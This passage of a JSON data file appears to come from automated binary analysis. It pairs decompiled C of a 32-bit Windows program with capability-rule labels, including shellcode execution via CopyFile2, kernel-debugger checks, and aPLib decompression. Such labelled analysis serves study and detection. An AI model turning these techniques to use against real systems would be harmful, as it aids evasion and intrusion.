arg_18h;\n    iVar3 = sub.ntdll.dll_memcmp(puVar1, &s2, 0x2c);\n    if (iVar3 == 0) {\n        return var_4h;\n    }\n    iVar3 = fcn.2000282f();\n    if (iVar3 == 0) {\n        return var_4h;\n    }\ncode_r0x20002b9f:\n    var_4h = 3;\ncode_r0x20002ba6:\n    sub.ntdll.dll_memcpy(puVar1, &s2, 0x2c);\n    return var_4h;\n}\n",
        "token_count": 843
    },
    "20002c51": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t fcn.20002c51(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t in_EAX;\n    uint32_t arg_18h;\n    int32_t *piVar4;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_1ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    arg_18h = 0x2c;\n    (**(*(in_EAX + 0x44) + 0x1c))(*(in_EAX + 0x48), 2);\n    piVar4 = *(in_EAX + 0x38);\n    while (piVar4 != NULL) {\n        var_8h = piVar4[7];\n        var_4h = (**(*(in_EAX + 0x44) + 0x14))(*(in_EAX + 0x48), &var_48h, 0x40, arg_18h);\n        if (var_4h != 0) goto code_r0x20002dc1;\n        piVar4[3] = arg_18h;\n        if (((*piVar4 == var_44h) && (piVar4[1] == var_1ch)) && (piVar4[2] == var_3ch)) {\n            piVar1 = piVar4[8];\n            iVar2 = *piVar1;\n            if ((iVar2 != var_48h) || (piVar3 = var_8h,  piVar1[1] != var_40h)) {\n                if (var_40h == 0xffff) {\n                    if (var_48h != iVar2) goto code_r0x20002dc1;\n                    fcn.20002c3e(piVar1, *piVar4);\n                    piVar3 = var_8h;\n                }\n                else {\n                    if (var_48h != iVar2) goto code_r0x20002dc1;\n                    fcn.20002c3e(piVar1, var_44h);\n                    var_4h = fcn.200028a0(var_48h, var_40h, var_44h, var_3ch, arg_18h, var_1ch);\n                    if (var_4h != 0) goto code_r0x20002dc1;\n                    fcn.20002744(var_48h, var_40h);\n                    fcn.200027a2();\n                    piVar3 = var_8h;\n                }\n            }\n        }\n        else {\n            piVar3 = piVar4;\n            if (var_40h != 0xffff) goto code_r0x20002dc1;\n        }\n        var_8h = piVar3;\n        arg_18h = arg_18h + 0x40 + var_1ch;\n        piVar4 = var_8h;\n    }\n    for (; arg_18h < *(in_EAX + 0x1c); arg_18h = arg_18h + 0x40 + var_1ch) {\n        var_4h = (**(*(in_EAX + 0x44) + 0x14))(*(in_EAX + 0x48), &var_48h, 0x40, arg_18h);\n        if (var_4h != 0) goto code_r0x20002dc1;\n        if (var_40h != 0xffff) {\n            var_4h = fcn.200028a0(var_48h, var_40h, var_44h, var_3ch, arg_18h, var_1ch);\n            if (var_4h != 0) goto code_r0x20002dc1;\n            fcn.20002744(var_48h, var_40h);\n            fcn.200027a2();\n        }\n    }\ncode_r0x20002dcb:\n    (**(*(in_EAX + 0x44) + 0x1c))(*(in_EAX + 0x48), 1);\n    return var_4h;\ncode_r0x20002dc1:\n    var_4h = fcn.20002a83();\n    goto code_r0x20002dcb;\n}\n",
        "token_count": 992
    },
    "20002fbf": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.20002fbf(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uchar auStack260 [64];\n    uchar auStack196 [44];\n    uchar auStack152 [8];\n    int32_t iStack144;\n    int32_t iStack108;\n    uchar auStack88 [8];\n    int32_t iStack80;\n    int32_t iStack44;\n    uint32_t uStack16;\n    int32_t iStack12;\n    int32_t iStack8;\n    \n    iVar2 = fcn.20002de0(&iStack8, 1);\n    iVar1 = iStack8;\n    if (iVar2 != 0) {\n        return;\n    }\n    sub.ntdll.dll_memcpy(auStack196, iStack8 + 8, 0x2c);\n    if (*(iVar1 + 0x20) != 0) {\n        (**(*(iVar1 + 0x44) + 0x1c))(*(iVar1 + 0x48), 2);\n        uVar4 = 0x2c;\n        iStack12 = 0;\n        if (0x2c < *(iVar1 + 0x1c)) {\n            do {\n                iVar2 = (**(*(iVar1 + 0x44) + 0x14))(*(iVar1 + 0x48), auStack88, 0x40, uVar4);\n                if (iVar2 != 0) goto code_r0x200031ac;\n                uStack16 = iStack44 + 0x40 + uVar4;\n                if (uStack16 <= uVar4) break;\n                if (iStack80 == 0xffff) {\n                    if (*(iVar1 + 0x1c) <= uStack16) break;\n                    iVar2 = (**(*(iVar1 + 0x44) + 0x14))(*(iVar1 + 0x48), auStack152, 0x40, uStack16);\n                    if (iVar2 != 0) goto code_r0x200031ac;\n                    iVar2 = iStack108 + 0x40;\n                    iStack8 = iVar2;\n                    if (iStack144 == 0xffff) {\n                        iStack44 = iStack44 + iVar2;\n                        iVar2 = (**(*(iVar1 + 0x44) + 0x18))(*(iVar1 + 0x48), auStack88);\n                        if (iVar2 != 0) goto code_r0x200031ac;\n                    }\n                    else {\n                        iVar3 = (**(*(iVar1 + 0x44) + 0x14))(*(iVar1 + 0x48), auStack260, 0x40, uVar4);\n                        if ((iVar3 != 0) || (iVar2 = (*_sym.imp.msvcrt.dll_malloc)(iVar2),  iVar2 == 0))\n                        goto code_r0x200031ac;\n                        iVar3 = (**(*(iVar1 + 0x44) + 0x14))(*(iVar1 + 0x48), iVar2, iStack8, uStack16);\n                        if ((iVar3 != 0) ||\n                           (iVar3 = (**(*(iVar1 + 0x44) + 0x18))(*(iVar1 + 0x48), iVar2, iStack8, uVar4),  iVar3 != 0))\n                        {\n                            (*_sym.imp.msvcrt.dll_free)(iVar2);\n                            goto code_r0x200031ac;\n                        }\n                        (*_sym.imp.msvcrt.dll_free)();\n                        iVar2 = (**(*(iVar1 + 0x44) + 0x18))\n                                          (*(iVar1 + 0x48), auStack260, 0x40, iStack108 + 0x40 + uVar4);\n                        if (iVar2 != 0) break;\n                    }\n                }\n                else {\n                    iStack12 = iStack12 + 1;\n                    uVar4 = uStack16;\n                }\n            } while (uVar4 < *(iVar1 + 0x1c));\n        }\n        *(iVar1 + 0x1c) = uVar4;\n        *(iVar1 + 0x18) = iStack12;\n        *(iVar1 + 0x20) = 0;\n        iVar2 = sub.ntdll.dll_memcmp(iVar1 + 8, auStack196, 0x2c);\n        if ((iVar2 != 0) && (iVar2 = fcn.2000282f(),  iVar2 != 0)) {\n            fcn.200026a7();\n            goto code_r0x200031ac;\n        }\n        fcn.20002a83();\n    }\n    iVar2 = fcn.2000275f(0);\n    if (iVar2 != *(iVar1 + 8)) {\n        fcn.20002bbd();\n    }\ncode_r0x200031ac:\n    (**(*(iVar1 + 0x44) + 0x1c))(*(iVar1 + 0x48), 1);\n    fcn.20002815();\n    return;\n}\n",
        "token_count": 1125
    },
    "2000daee": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2000daee(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint var_4h;\n    \n    iVar5 = arg_8h;\n    iVar6 = *(arg_8h + 0x3c) + arg_8h;\n    if (*(iVar6 + 0x18) == 0x10b) {\n        iVar10 = *(iVar6 + 0xa0);\n        iVar3 = *(iVar6 + 0x34);\n        uVar7 = *(iVar6 + 0x70);\n    }\n    else {\n        iVar10 = *(iVar6 + 0xb0);\n        iVar3 = *(iVar6 + 0x30);\n        uVar7 = *(iVar6 + 0x80);\n    }\n    uVar9 = arg_ch - iVar3;\n    if (uVar9 == 0) {\n        iVar6 = 0;\n    }\n    else if (iVar10 == 0) {\n        iVar6 = -((uVar7 & 1) != 0);\n    }\n    else {\n        while( true ) {\n            piVar1 = iVar10 + iVar5;\n            iVar6 = piVar1[1];\n            if (iVar6 == 0) break;\n            uVar7 = iVar6 - 8U >> 1 & 0xffff;\n            arg_8h = 0;\n            if (uVar7 != 0) {\n                do {\n                    uVar2 = *(iVar5 + 8 + iVar10 + arg_8h * 2);\n                    iVar6 = (uVar2 & 0xfff) + *piVar1;\n                    uVar2 = uVar2 >> 0xc;\n                    if (uVar2 != 0) {\n                        if (uVar2 == 1) {\n                            *(iVar6 + iVar5) = *(iVar6 + iVar5) + (uVar9 >> 0x10);\n                        }\n                        else if (uVar2 == 2) {\n                            *(iVar6 + iVar5) = *(iVar6 + iVar5) + uVar9;\n                        }\n                        else if (uVar2 == 3) {\n                            *(iVar6 + iVar5) = *(iVar6 + iVar5) + uVar9;\n                        }\n                        else {\n                            if ((uVar2 == 4) || (uVar2 != 10)) {\n                                return 0x21590064;\n                            }\n                            puVar8 = iVar6 + iVar5;\n                            uVar4 = *puVar8;\n                            *puVar8 = *puVar8 + uVar9;\n                            puVar8[1] = puVar8[1] + CARRY4(uVar4, uVar9);\n                        }\n                    }\n                    arg_8h = arg_8h + 1;\n                } while (arg_8h < uVar7);\n            }\n            iVar10 = iVar10 + piVar1[1];\n        }\n    }\n    return iVar6;\n}\n",
        "token_count": 723
    },
    "200158c9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.200158c9(int32_t *arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint arg_18h, uint arg_1ch, uint32_t arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.msvcrt.dll_malloc)(0x20);\n    if (iVar1 == 0) {\n        iVar2 = 0x21590004;\n    }\n    else {\n        sub.ntdll.dll_memset(iVar1, 0, 0x20);\n        var_4h = 0;\n        var_8h = arg_ch;\n        iVar2 = fcn.200227c2(iVar1 + 4, &var_8h, arg_18h, arg_1ch, arg_20h >> 1 & 1);\n        if (iVar2 == 0) {\n            *(iVar1 + 0x14) = 1000;\n            *(iVar1 + 0x18) = 500;\n            *(iVar1 + 0x1c) = 5000;\n            fcn.200012fa(iVar1 + 8);\n            *arg_8h = iVar1;\n        }\n        else {\n            (*_sym.imp.msvcrt.dll_free)(iVar1);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 322
    },
    "20015ce1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20015ce1(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.msvcrt.dll_malloc)(0x6c);\n    if (iVar1 == 0) {\n        iVar2 = 0x21590004;\n    }\n    else {\n        sub.ntdll.dll_memset(iVar1, 0, 0x6c);\n        var_4h = 0;\n        var_8h = arg_ch;\n        iVar2 = fcn.2001300b(iVar1 + 4, &var_8h, arg_10h, arg_14h, 0, 0, arg_18h & 1);\n        if (iVar2 == 0) {\n            *(iVar1 + 0xc) = 1;\n            fcn.20001551(iVar1 + 0x14);\n            fcn.20001551(iVar1 + 0x2c);\n            fcn.20001551(iVar1 + 0x44);\n            *arg_8h = iVar1;\n            iVar2 = 0;\n        }\n        else {\n            (*_sym.imp.msvcrt.dll_free)(iVar1);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 325
    },
    "20015d75": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20015d75(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.msvcrt.dll_malloc;\n    iVar2 = (*_sym.imp.msvcrt.dll_malloc)(0x6c);\n    if (iVar2 == 0) {\n        iVar3 = 0x21590004;\n    }\n    else {\n        sub.ntdll.dll_memset(iVar2, 0, 0x6c);\n        iVar3 = (*pcVar1)(arg_14h);\n        *(iVar2 + 0x5c) = iVar3;\n        if (iVar3 == 0) {\n            (*_sym.imp.msvcrt.dll_free)(iVar2);\n            iVar3 = 0x21590004;\n        }\n        else {\n            sub.ntdll.dll_memcpy(iVar3, arg_10h, arg_14h);\n            *(iVar2 + 0x60) = arg_14h;\n            *(iVar2 + 100) = arg_18h;\n            iVar3 = (*_sym.imp.msvcrt.dll__strdup)(arg_ch);\n            *(iVar2 + 0x68) = iVar3;\n            if (iVar3 == 0) {\n                (*_sym.imp.msvcrt.dll_free)(*(iVar2 + 0x5c));\n                iVar3 = 0x21590004;\n            }\n            else {\n                var_8h = arg_ch;\n                var_4h = 0;\n                iVar3 = fcn.2001300b(iVar2 + 8, &var_8h, 0, 0, arg_10h, arg_14h, (arg_18h & 1) * 2);\n                if (iVar3 == 0) {\n                    *(iVar2 + 0xc) = 0;\n                    fcn.20001551(iVar2 + 0x14);\n                    fcn.20001551(iVar2 + 0x2c);\n                    *arg_8h = iVar2;\n                    return 0;\n                }\n            }\n            (*_sym.imp.msvcrt.dll_free)(iVar2);\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 531
    },
    "20016229": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20016229(int32_t arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if ((arg_14h & 1) == 0) {\n        fcn.20001567(arg_8h + 0x2c);\n    }\n    else {\n        iVar1 = fcn.20001572();\n        if (iVar1 == 0) {\n            return 0x21590002;\n        }\n    }\n    uVar2 = fcn.20015fd8(arg_ch, arg_10h, 0, 0, 0, 0);\n    fcn.2000157d(arg_8h + 0x2c);\n    return uVar2;\n}\n",
        "token_count": 182
    },
    "20017d35": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20017d35(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.msvcrt.dll_malloc)(0x178);\n    if (iVar1 == 0) {\n        iVar2 = 0x21590004;\n    }\n    else {\n        sub.ntdll.dll_memset(iVar1, 0, 0x178);\n        *(iVar1 + 4) = 0x200174fe;\n        *(iVar1 + 8) = fcn.2001747d;\n        *(iVar1 + 0xc) = 0x20017524;\n        *(iVar1 + 0x10) = fcn.20017605;\n        var_4h = 0;\n        var_8h = arg_ch;\n        iVar2 = fcn.2001300b(iVar1 + 0x14, &var_8h, arg_10h, arg_14h, 0, 0, (arg_18h & 1) != 0);\n        if (iVar2 == 0) {\n            fcn.20001551(iVar1 + 0x18);\n            fcn.20001551(iVar1 + 0x144);\n            piVar3 = iVar1 + 0x4c;\n            iVar2 = 0xb;\n            do {\n                *piVar3 = iVar1;\n                piVar3 = piVar3 + 6;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n            *arg_8h = iVar1;\n            iVar2 = 0;\n        }\n        else {\n            (*_sym.imp.msvcrt.dll_free)(iVar1);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 443
    },
    "20018a29": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20018a29(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    code *pcVar1;\n    int32_t arg_10h_00;\n    int32_t iVar2;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_10h_00 = (*_sym.imp.msvcrt.dll_malloc)(0x1a4);\n    if (arg_10h_00 == 0) {\n        return 0x21590004;\n    }\n    sub.ntdll.dll_memset(arg_10h_00, 0, 0x1a4);\n    var_8h = 0;\n    *(arg_10h_00 + 4) = 0x20016ee5;\n    *(arg_10h_00 + 8) = 0x20016e99;\n    *(arg_10h_00 + 0xc) = 0x20017012;\n    *(arg_10h_00 + 0x10) = fcn.200185b1;\n    if ((arg_18h & 1) != 0) {\n        var_8h = 2;\n    }\n    var_ch = 0;\n    var_10h = arg_ch;\n    var_4h = fcn.2001300b(arg_10h_00 + 0x14, &var_10h, 0, 0, arg_10h, arg_14h, var_8h);\n    if (var_4h == 0) {\n        iVar2 = (*_sym.imp.msvcrt.dll__strdup)(arg_ch);\n        *(arg_10h_00 + 0x58) = iVar2;\n        if (iVar2 != 0) {\n            iVar2 = (*_sym.imp.msvcrt.dll_malloc)(arg_14h);\n            *(arg_10h_00 + 0x54) = iVar2;\n            if (iVar2 != 0) {\n                sub.ntdll.dll_memcpy(iVar2, arg_10h, arg_14h);\n                *(arg_10h_00 + 0x60) = var_8h;\n                *(arg_10h_00 + 0x5c) = arg_14h;\n                iVar2 = fcn.200012fa(arg_10h_00 + 0x88);\n                if ((iVar2 == 0) || (iVar2 = fcn.20001cfb(arg_10h_00 + 0x80, 0x200172da, arg_10h_00),  iVar2 != 0)) {\n                    var_4h = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                }\n                else {\n                    fcn.20001551(arg_10h_00 + 0x68);\n                    fcn.20001911(arg_10h_00 + 0x1c);\n                    *arg_8h = arg_10h_00;\n                    var_4h = 0;\n                }\n                if (var_4h == 0) {\n                    return 0;\n                }\n                goto code_r0x20018b51;\n            }\n        }\n        var_4h = 0x21590004;\n    }\ncode_r0x20018b51:\n    iVar2 = fcn.200012e7(arg_10h_00 + 0x88);\n    if (iVar2 != 0) {\n        fcn.200012a9(arg_10h_00 + 0x88);\n    }\n    pcVar1 = _sym.imp.msvcrt.dll_free;\n    (*_sym.imp.msvcrt.dll_free)(*(arg_10h_00 + 0x58));\n    (*pcVar1)(*(arg_10h_00 + 0x54));\n    fcn.20013237(arg_10h_00 + 0x14, 0);\n    (*pcVar1)(arg_10h_00);\n    return var_4h;\n}\n",
        "token_count": 907
    },
    "2001a355": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2001a355(int32_t *arg_8h, uint noname_1, uint arg_10h, int32_t arg_14h, uint32_t arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((arg_18h & 1) == 0) {\n        return 0x21590001;\n    }\n    iVar1 = sub.ntdll.dll_strlen(arg_10h);\n    if (iVar1 + 1 == arg_14h) {\n        iVar1 = (*_sym.imp.msvcrt.dll_malloc)(0x14);\n        if (iVar1 != 0) {\n            sub.ntdll.dll_memset(iVar1, 0, 0x14);\n            iVar2 = (*_sym.imp.msvcrt.dll__strdup)(arg_10h);\n            *(iVar1 + 8) = iVar2;\n            if (iVar2 != 0) {\n                fcn.20001567(0x20047028);\n                *0x20047040 = *0x20047040 + '\\x01';\n                *(iVar1 + 0xc) = *0x20047040;\n                fcn.2000157d(0x20047028);\n                *arg_8h = iVar1;\n                return 0;\n            }\n            (*_sym.imp.msvcrt.dll_free)(iVar1);\n        }\n        return 0x21590004;\n    }\n    return 0x21590064;\n}\n",
        "token_count": 329
    },
    "200244ae": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.200244ae(int32_t *param_1)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    \n    pcVar2 = _sym.imp.msvcrt.dll_free;\n    if (param_1 != NULL) {\n        if ((*param_1 != 0) && (sub.ntdll.dll_memset(*param_1, 0, param_1[2] << 2),  (*(param_1 + 4) & 2) == 0)) {\n            (*pcVar2)(*param_1);\n        }\n        uVar1 = param_1[4];\n        sub.ntdll.dll_memset(param_1, 0, 0x14);\n        if ((uVar1 & 1) != 0) {\n            (*pcVar2)(param_1);\n        }\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "20024501": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.20024501(int32_t *param_1)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = _sym.imp.msvcrt.dll_free;\n    if (param_1 != NULL) {\n        if ((*param_1 != 0) && ((*(param_1 + 4) & 2) == 0)) {\n            (*_sym.imp.msvcrt.dll_free)(*param_1);\n        }\n        param_1[4] = param_1[4] | 0x8000;\n        if ((*(param_1 + 4) & 1) != 0) {\n            (*pcVar1)(param_1);\n        }\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "20025bf9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.20025bf9(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (param_1 != 0) {\n        iVar2 = param_1 + 4;\n        iVar1 = 0x10;\n        do {\n            fcn.200244ae(iVar2);\n            iVar2 = iVar2 + 0x14;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n        if ((*(param_1 + 0x144) & 1) != 0) {\n            (*_sym.imp.msvcrt.dll_free)(param_1);\n        }\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "20025f2c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.20025f2c(int32_t param_1)\n\n{\n    if (param_1 != 0) {\n        fcn.20024501(param_1 + 4);\n        fcn.20024501(param_1 + 0x18);\n        fcn.20024501(param_1 + 0x2c);\n        if ((*(param_1 + 0x44) & 1) != 0) {\n            (*_sym.imp.msvcrt.dll_free)(param_1);\n        }\n    }\n    return;\n}\n",
        "token_count": 121
    },
    "2000dff5": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.2000dff5(uint arg_8h, uint s1, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    uint32_t uVar5;\n    uint32_t *puVar6;\n    uint var_28h;\n    uint var_24h;\n    uint ptr;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.20011888(0x20032418, 0x18);\n    uVar5 = 0;\n    if ((*(unaff_EBP + 0xc) != 0) && (puVar2 = *(unaff_EBP + 0x14),  puVar2 != NULL)) {\n        iVar3 = (*_sym.imp.ntdll.dll__wcsnicmp)(*(unaff_EBP + 0xc), L\"api-\", 4);\n        if ((iVar3 == 0) &&\n           (iVar3 = fcn.2000dd81(*(unaff_EBP + 8), L\"apisetschema.dll\", 0, unaff_EBP + -0x20, 0),  iVar3 == 0)) {\n            iVar3 = fcn.2000dc93(*(unaff_EBP + -0x20), \".apiset\", 0, 0, unaff_EBP + -0x24, 0);\n            *(unaff_EBP + -0x1c) = iVar3;\n            if (iVar3 == 0) {\n                *(unaff_EBP + -4) = 0;\n                *(unaff_EBP + -0x28) = 0;\n                iVar3 = *(unaff_EBP + -0x24);\n                while (uVar5 < *(iVar3 + 4)) {\n                    iVar4 = uVar5 * 0xc + iVar3;\n                    iVar4 = (*_sym.imp.ntdll.dll__wcsnicmp)\n                                      (*(unaff_EBP + 0xc) + 8, *(iVar4 + 8) + iVar3, *(iVar4 + 0xc) >> 1);\n                    if (iVar4 == 0) {\n                        if (uVar5 < *(iVar3 + 4)) {\n                            puVar6 = *(uVar5 * 0xc + 0x10 + iVar3) + iVar3;\n                            if (*puVar6 != 0) {\n                                uVar5 = *puVar2;\n                                if (*puVar6 <= uVar5) {\n                                    *(unaff_EBP + -0x1c) = 0x2159000e;\n                                    goto code_r0x2000e13f;\n                                }\n                                uVar1 = puVar6[uVar5 * 4 + 4] + 2;\n                                if (*(unaff_EBP + 0x10) <= uVar1 && uVar1 != *(unaff_EBP + 0x10)) {\n                                    *(unaff_EBP + -0x1c) = 0x2159000b;\n                                    goto code_r0x2000e13f;\n                                }\n                                iVar4 = *(unaff_EBP + 0xc);\n                                sub.ntdll.dll_memcpy(iVar4, puVar6[uVar5 * 4 + 3] + iVar3, puVar6[uVar5 * 4 + 4]);\n                                *(iVar4 + (puVar6[(*puVar2 + 1) * 4] & 0xfffffffe)) = 0;\n                                if (*puVar2 < *puVar6 - 1) {\n                                    *puVar2 = *puVar2 + 1;\n                                    goto code_r0x2000e0c3;\n                                }\n                            }\n                        }\n                        break;\n                    }\n                    uVar5 = uVar5 + 1;\n                    *(unaff_EBP + -0x28) = uVar5;\n                }\n                *puVar2 = 0xffffffff;\ncode_r0x2000e0c3:\n                *(unaff_EBP + -0x1c) = 0;\ncode_r0x2000e13f:\n                *(unaff_EBP + -4) = 0xffffffff;\n            }\n            (*_sym.imp.msvcrt.dll_free)(*(unaff_EBP + -0x20));\n        }\n        else {\n            *puVar2 = 0xffffffff;\n        }\n    }\n    fcn.200118c3();\n    return;\n}\n",
        "token_count": 1023
    },
    "2001c77a": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n\nuint __cdecl fcn.2001c77a(uint32_t arg_8h)\n\n{\n    uchar *puVar1;\n    uchar uVar2;\n    uint *in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t unaff_EBX;\n    uint8_t *unaff_ESI;\n    uint var_124h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_4h;\n    \n    if (unaff_EBX == 0) {\n        uVar3 = 0x21590065;\n    }\n    else {\n        sub.ntdll.dll_memset(&var_24h, 0, 0x20);\n        var_1ch = 3;\n        var_24h = in_EAX;\n        if (((arg_8h & 8) == 0) && (in_EAX == NULL)) {\n            var_24h = &var_14h;\n            iVar4 = fcn.200018bf();\n            var_4h = 0;\n            var_ch = iVar4 % *(unaff_EBX + 0x68) + 1;\n            if (0 < var_ch) {\n                do {\n                    uVar2 = fcn.200018bf();\n                    iVar4 = var_4h + 1;\n                    puVar1 = &var_124h + var_4h;\n                    var_4h = iVar4;\n                    *puVar1 = uVar2;\n                } while (iVar4 < var_ch);\n            }\n            var_10h = &var_124h;\n        }\n        *unaff_ESI = *unaff_ESI ^ unaff_ESI[2] >> 1;\n        unaff_ESI[1] = unaff_ESI[1] ^ unaff_ESI[2] >> 1;\n        uVar3 = fcn.20013845(*(unaff_EBX + 4), &var_24h, arg_8h);\n        *unaff_ESI = *unaff_ESI ^ unaff_ESI[2] >> 1;\n        unaff_ESI[1] = unaff_ESI[1] ^ unaff_ESI[2] >> 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 538
    },
    "2001ca1d": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.2001ca1d(uint noname_0, uint arg_ch, uint32_t arg_10h, code *arg_14h, uint arg_18h)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t var_8h;\n    \n    if (3 < arg_10h) {\n        sub.ntdll.dll_memcpy(&var_8h, arg_ch, 4);\n        if (((var_8h >> 8 ^ var_8h._2_1_ >> 1) & 0x40) == 0) {\n            var_8h = (var_8h & 0xffff0000 | CONCAT11(var_8h._2_1_ >> 1, var_8h)) ^ 0x2000;\n            iVar2 = fcn.200018bf();\n            uVar3 = iVar2 % 5;\n            uVar4 = 0;\n            if (uVar3 != 0) {\n                do {\n                    uVar1 = fcn.200018bf();\n                    *(&var_8h + uVar4 + 3) = uVar1;\n                    uVar4 = uVar4 + 1;\n                } while (uVar4 < uVar3);\n            }\n            (*arg_14h)(arg_18h, &var_8h, uVar3 + 4);\n        }\n    }\n    return;\n}\n",
        "token_count": 337
    },
    "2001d2c7": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
